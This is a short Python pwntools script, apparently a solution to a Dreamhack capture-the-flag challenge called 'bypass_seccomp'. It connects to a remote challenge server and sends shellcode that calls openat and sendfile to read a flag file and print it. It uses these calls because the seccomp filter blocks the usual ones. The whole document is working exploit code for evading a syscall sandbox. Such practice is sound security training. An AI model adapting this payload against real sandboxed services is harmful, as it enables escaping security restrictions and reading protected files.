from pwn import *

p = remote("host3.dreamhack.games", "15839")
#p = process("./bypass_seccomp")
context.arch = 'x86_64'

shellcode = shellcraft.openat(0, b"/home/bypass_syscall/flag")
shellcode += shellcraft.sendfile(1, 'rax', 0, 0xffff)
shellcode += shellcraft.exit(0)

p.sendline(asm(shellcode))

p.interactive()